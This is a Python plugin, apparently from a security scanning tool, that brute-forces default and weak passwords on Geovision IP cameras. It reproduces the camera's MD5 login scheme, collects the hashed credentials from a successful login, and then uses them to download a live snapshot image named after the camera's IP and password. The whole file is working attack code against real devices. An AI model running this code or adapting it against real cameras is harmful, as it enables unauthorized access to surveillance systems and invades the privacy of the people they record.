import hashlib
import re
import requests

from loguru import logger

from .base import POCTemplate


class GeovisionWeakPassword(POCTemplate):
    product_key = 'geovision'

    def verify(self, ip, port=80):
        session = requests.session()
        headers = {'User-Agent': self.config.user_agent}

        # Fetch login page to get cc1, cc2, token required for auth
        cc1, cc2, token = '', '', ''
        try:
            info_req = session.get(f"http://{ip}:{port}/ssi.cgi/Login.htm",
                                   timeout=self.config.timeout, headers=headers, verify=False)
            if info_req.status_code == 200:
                if res := re.findall(r'var cc1="(.*)"; var cc2="(.*)"', info_req.text):
                    cc1, cc2 = res[0]
                if res := re.findall(r"name=web_login_token type=hidden value='(.*)'", info_req.text):
                    token = res[0]
        except Exception as e:
            logger.debug(e)
            return None

        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    data = {
                        'username': '', 'password': '', 'Apply': '&#24212;&#29992;',
                        'umd5': hashlib.md5((cc1 + user + cc2).encode('utf-8')).hexdigest().upper(),
                        'pmd5': hashlib.md5((cc2 + password + cc1).encode('utf-8')).hexdigest().upper(),
                        'browser': 1, 'is_check_OCX_OK': 0,
                    }
                    if token:
                        data['web_login_token'] = int(token)
                        data['browser'] = ''
                    req = session.post(f"http://{ip}:{port}/LoginPC.cgi", data=data,
                                       timeout=self.config.timeout, headers=headers, verify=False)
                    if req.status_code == 200 and 'Web-Manager' in req.text:
                        hashed_user = re.findall(r'gUserName = "(.*)"', req.text)[0]
                        hashed_password = re.findall(r'gPassword = "(.*)"', req.text)[0]
                        desc = re.findall(r'gDesc = "(.*)"', req.text)[0]
                        return ip, str(port), self.product, str(user), str(password), self.name, hashed_user, hashed_password, desc
                except Exception as e:
                    logger.debug(e)
        return None

    def exploit(self, results):
        ip, port, _, user, password, _, hashed_user, hashed_password, desc = results
        url = (f"http://{ip}:{port}/PictureCatch.cgi?username={hashed_user}"
               f"&password={hashed_password}&data_type=0&attachment=1&channel=1&secret=1&key={desc}")
        return self._snapshot(url, f"{ip}-{port}-{user}-{password}.jpg")
